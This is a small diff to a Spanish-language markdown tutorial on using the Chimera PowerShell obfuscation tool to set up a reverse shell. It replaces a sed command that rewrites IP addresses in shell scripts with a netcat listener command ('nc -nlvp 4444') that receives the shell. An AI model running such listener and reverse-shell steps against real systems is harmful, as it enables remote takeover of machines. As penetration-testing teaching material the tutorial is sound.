@@ -186,7 +186,7 @@ Una vez instalado [Chimera](https://github.com/tokyoneon/Chimera) debemos adecua
 Y posteriormente levantar nuestra Reverse Shell:
  
  ```bash
-/opt/chimera$ sed -i 's/192.168.56.101/10.0.2.5/g' shells/*.ps1
+nc -nlvp 4444
  ```
  
 <details><summary>Reverse Shell en PowerShell sin ofuscar</summary>
